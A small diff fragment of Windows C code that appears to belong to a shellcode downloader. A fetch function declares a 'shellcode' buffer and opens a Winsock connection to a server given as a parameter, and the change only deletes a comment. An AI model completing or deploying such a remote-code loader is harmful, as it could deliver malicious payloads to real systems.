@@ -27,8 +27,6 @@ void fetch(string server, string path) {
 	string response;
 	unsigned char shellcode[8192];
 
-	// call message box function
-
 	// initialize winsock, create socket and connect to server
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
 	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
